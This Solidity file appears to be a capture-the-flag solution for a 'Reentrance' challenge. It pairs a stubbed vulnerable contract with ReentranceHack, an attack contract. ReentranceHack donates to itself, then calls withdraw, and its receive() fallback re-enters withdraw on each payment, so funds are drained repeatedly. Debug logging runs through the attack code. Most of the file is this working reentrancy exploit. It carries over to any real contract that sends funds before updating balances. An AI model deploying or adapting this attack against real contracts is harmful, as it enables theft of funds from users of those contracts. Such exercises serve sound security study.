pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';

import "hardhat/console.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
  }

  function balanceOf(address _who) public view returns (uint balance) {

  }

  function withdraw(uint _amount) public {

  }

  receive() external payable {}
}


contract ReentranceHack{

    Reentrance rere;
    address glb_pay_address;
    address payable rere_address;


    constructor(address payable init_addr, address donate_address){
        
        rere_address = init_addr;
        rere = Reentrance(rere_address);

        
        glb_pay_address = donate_address;
        // rere.donate{value: 1 ether}(donate_address);



    }

    function donatee() payable public {

        console.log("about to donate");
        rere.donate{value: msg.value}(address(this));
        console.log("Donated");

    }
    function getCash() public {
        
        console.log("In Get Cash function");
        console.log("Cash before");
        console.log(rere.balanceOf(glb_pay_address));

        rere.withdraw(1000000000000000000);

        console.log("Cash After");
        console.log(rere.balanceOf(glb_pay_address));
        console.log("Done with Get Cash function");

    }

    receive() external payable {

        console.log("Balance of Contract");
        console.log(address(rere_address).balance);
        
        console.log("In this");
        rere.withdraw(100000000000000000);

    }
}